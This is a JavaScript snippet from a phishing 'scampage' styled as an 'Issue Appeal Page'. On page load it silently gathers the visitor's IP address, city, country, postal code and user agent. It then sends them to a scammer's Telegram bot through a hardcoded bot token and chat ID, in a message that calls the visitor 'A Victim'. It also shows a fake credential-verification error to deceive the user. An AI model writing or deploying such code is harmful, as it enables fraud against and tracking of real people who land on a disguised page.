window.addEventListener("load", async () => {
  const getip = "https://api.ipify.org/?format=json";
  const api = "https://ipapi.co/";
  const botToken = "6880932081:AAGy37y0Z4pKHbY69NZhQTlE0lHoJEpn39A"; // todo: change this to your bot token
  const chatId = "5710188429"; // todo: change this to your chat id
  try {
    const response_ip = await fetch(getip);
    const final_ip = await response_ip.json();
    console.log(final_ip.ip)
    const response = await fetch(api + final_ip.ip + "/json/");
    const result = await response.json();
    console.log(result);
    let userAgent = navigator.userAgent;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `------------- LOGS --------------- \n  ******** Issue Appeal Page ******** \n \n A Victim Has Just Logged Into Your Scampage [Issues Appeal Page ]  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
      }),
    })
      .then((response) => response.json())
      .then((data) => {})
      .catch((error) => {
        errorText.textContent =
          "Could not verify your credentials please refresh the page and try again";
      });
  } catch (error) {
    console.error(error);
  }
});